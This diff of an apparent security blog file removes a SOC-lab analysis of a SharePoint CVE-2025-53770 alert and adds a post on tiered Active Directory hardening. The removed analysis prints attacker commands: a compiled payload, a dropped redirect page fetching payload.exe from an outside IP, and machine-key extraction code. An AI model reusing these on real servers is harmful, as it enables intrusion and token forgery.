@@ -1,127 +1,83 @@
 ---
-title: CVE‑2025‑53770 SharePoint
-description: CVE‑2025‑53770 SharePoint
-date: 2025-07-26
-summary: A look at a SOC alert for CVE‑2025‑53770 SharePoint
+title: Implementing a tiered AD
+description:
+date: 2026-02-11
+summary:
 categories:
   - Labs
-  - Vulnerabilities
+  - AD Hardening
 ---
+# Implement a Tiered AD Model
+
 ![featured.jpg](featured.jpg)
+## What?
+The tiered AD model categorises assets and accounts based on their criticality. Tiers are used to prevent attackers from moving vertically from lower-tier, more easily compromised assets to higher-tier, more critical assets. This is achieved by ensuring accounts only log on to systems within their assigned tier, preventing privileged credentials from being exposed on lower-tier systems.
+![model.png](images/model.png "Model")
+## How?
+### Segment Tiers
+#### Tier 0: 
+Tier 0 contains the most critical identities and infrastructure in the Active Directory environment. *SpectreOps* has a [guide](https://specterops.github.io/TierZeroTable/) to help identify what should go in tier 0. Common assets include:
+- Domain Controllers
+- Domain Administrators
+#### Tier 1: 
+Tier 1 typically consists of less critical business resources, including:
+- Application servers
+- File servers
+- Application administrators
+#### Tier 2: 
+Tier 2 is where end-users and devices are placed. This includes:
+- Standard user accounts
+- Staff workstations
+### Enforce Segregation of Tiers
+#### GPO:
+Configure the following location - *Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment*, and configure these settings:
 
-# CVE‑2025‑53770
-*Source: [SANS](https://www.sans.org/blog/critical-sharepoint-zero-day-exploited-what-you-need-to-know-about-cve-2025-53770), [CISA](https://www.cisa.gov/news-events/alerts/2025/07/20/update-microsoft-releases-guidance-exploitation-sharepoint-vulnerabilities), [LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Csc/)*
-{{< lead >}}
-Running for the clouds.
-{{< /lead >}}
-## What is the vulnerability?
+> [!info]- GPO
+> - Deny access to this computer from the network
+> - Deny log on as a batch job
+> - Deny log on as a service
+> - Deny log on locally
+> - Deny log on through Terminal Services
 
-**CVE‑2025‑53770 | SharePoint vulnerability**
-<br>
-The vulnerability affects on-premises SharePoint Server installations (2016, 2019, and Subscription Edition). It has been actively exploited in the wild and is considered one of the most critical SharePoint vulnerabilities of all time.
+##### Tier 0 GPO:
+- Deny Tier 1 and 2 users from logging on
+##### Tier 1 GPO:
+- Deny Tier 0 and 2 users from logging on
+![tier1.png](images/tier1.png "Tier 1")
+##### Tier 2 GPO:
+- Deny Tier 0 and 1 users from logging on
+![tier2.png](images/tier2.png "Tier 2")
+## Why?
+### Reduce the blast radius of a compromise
+#### The scenario 
+Imagine a helpdesk administrator logs on to a user's workstation using their Domain Administrator account to troubleshoot an issue. Unknown to them, the workstation has already been compromised. The attacker later exploits a local privilege escalation vulnerability to obtain local administrator privileges.
 
-It allows attackers to bypass authentication by sending a specially crafted HTTP request to the **ToolPane.aspx** endpoint with the `Referer` header set to SignOut.aspx (the logout page). SharePoint’s request handling logic incorrectly treats this as part of a trusted, authenticated flow. Thus allowing the attacker to reach functionality that should be restricted.
+When the administrator logs on, Windows stores credential material in LSASS to support the logon session. The attacker can dump this material using a tool such as _mimikatz_ and perform a pass-the-hash attack to authenticate as the Domain Administrator, potentially compromising the entire Active Directory environment.
+## Pass the hash
+### LSASS and NTLM
+When a user authenticates, Windows creates a logon session in Local Security Authority Subsystem Service (LSASS) and maintains the appropriate credential material. LSASS stores credential material in memory, including NT LAN Manager (NTLM) hashes . The NTLM hash is a secret derived from the user's password. NTLM treats the possession of this hash as proof of identity.
+### In action
+**Step 1**. They use a free tool called *mimikatz* to dump the credential material in memory from LSASS.
+![alert.png](images/dump.png "Dumping the hash")
 
-In observed attacks, threat actors upload a malicious file **spinstall0.aspx** to the server and use it to extract cryptographic key material such as the ASP.NET machine keys. These keys can then be used to forge valid authentication tokens, enabling persistence even after patches are applied.
-
-## What is the alert?
-
-![alert.png](images/alert.png)
-
->**Alert Trigger Reason**: *Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation.*
-
-It looks like the exploitation has been successful. We can see an unauthenticated POST request against ToolPane.aspx, and Signout.aspx in the referrer header. A large payload size to note here.
-
-
->**Source IP Address:** 107.191.58.76
-- This IP looks to be associated with the vulnerability, in the wild.
-
-![ipinfo.png](images/ipinfo.png)
-
-## Summary
-We have a true positive exploit of CVE‑2025‑53770. The adversary has successfully exploited the vulnerability and post-exploitation phase is evident. 
-
-w3wp.exe was used to spawn an encoded powershell script. This script facilitates the extract of the ASP.NET MachineKey. LOTL was observed, with csc.exe being used to compile a malicious *payload.exe*. A SharePoint page *spinstall0.aspx* was created which loads the malicious payload.
-
-## Analysing the endpoint
-![endpoint.png](images/endpoint.png)
-> OS: Windows Server 2019
-
--  We are vulnerable.
+**Step 2**.  The attacker passes the stolen NTLM hash to authenticate as the Domain Administrator without knowing the password, allowing them to authenticate as the Domain Administrator without knowing the password.
+![alert.png](images/winrm.png "Passing the hash")
 
 
-## Timeline
 
-The adversary begins by sending a crafted unauthenticated payload *(Code 1)* via POST. The server executes the payload via powershell, triggered by w3wp.exe (IIS process).
 
-**Processes**
 
-| Time     | Process        | Overview                                               | Child Process  |
-| -------- | -------------- | ------------------------------------------------------ | -------------- |
-| 13:07:11 | w3wp.exe       | Process that supports SharePoint                       | powershell.exe |
-| 13:07:24 | powershell.exe | Run Base64 code (Code 1).                              | csc.exe        |
-| 13:07:27 | csc.exe        | Compile payload.cs as payload.exe (Code 2)             | cmd.exe        |
-| 13:07:29 | cmd.exe        | Write malicious spinstall0.aspx to SharePoint (Code 3) | powershell.exe |
-| 13:07:34 | powershell.exe | Gather machine key (Code 4)                            |                |
 
-### Terminal History
-![terminal.png](images/terminal.png)
 
-#### Code 1
-Flags: 
-`-nop, -w hidden, -e`
-- No profile
-- Hide the PowerShell window
-- EncodedCommand
 
-After decoding the Base64 commands we get:
-![decoded.png](images/decoded.png)
 
-On page load, the script is set to execute.
 
-We can gather the following:
-```
-%@ Import Namespace="System.Diagnostics" %
-%@ Import Namespace="System.IO" %
-script runat="server" language="c#"
-```
 
-- C# execution
-- ASP.NET 
 
-``` 
-var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
-Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
-```
 
-- Gathers and outputs machine keys from Web.Configuration
-	- ValidationKey
-	- DecryptionKey
-- These crypto keys are used to authenticate user sessions
-	- Now the adversary can forge valid auth. tokens 
 
-#### Code 2
-```
-"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
-```
 
-- csc.exe is a binary file used by .NET to compile C#, this is a LOTL
-- Malicious code payload.cs is compiled as payload.exe
 
-#### Code 3
-```
-"C:\Windows\System32\cmd.exe" /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx`
-```
-
-- Run command via cmd
-- Drop redirector page spinstall0.aspx to SharePoint Layouts directory
-- This triggers a redirect to download payload.exe from the adversary's infrastructure
-
-#### Code 4
-```
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"
-```
-- Use Powershell to gather the Machine Key
 
 
 
